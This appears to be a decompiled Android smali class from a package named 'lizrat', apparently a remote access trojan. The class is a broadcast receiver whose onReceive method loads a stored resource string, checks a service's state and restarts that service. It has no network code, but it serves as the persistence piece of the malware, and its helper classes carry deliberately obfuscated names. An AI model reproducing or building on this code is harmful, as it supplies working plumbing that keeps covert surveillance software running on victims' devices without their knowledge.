.class public LLiz0rd/lizrat/RC;
.super Landroid/content/BroadcastReceiver;
.source "RC.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 7
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1

    .line 13
    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p2

    const v0, 0x7f070002

    invoke-virtual {p2, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p2

    sput-object p2, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->p_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_r:Ljava/lang/String;

    .line 14
    sget-object p2, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    if-nez p2, :cond_0

    .line 16
    sput-object p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    .line 19
    :cond_0
    const-class p2, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    invoke-static {p2, p1}, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew30;->fitltrialrfairlyglesskkennethqspecificationstenterpriseswcigarettesrmatewtonyldimelinkingz49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p2

    if-eqz p2, :cond_1

    .line 20
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p2

    invoke-virtual {p2, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p2

    sput-object p2, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->p_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_r:Ljava/lang/String;

    .line 22
    new-instance p2, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    return-void
.end method
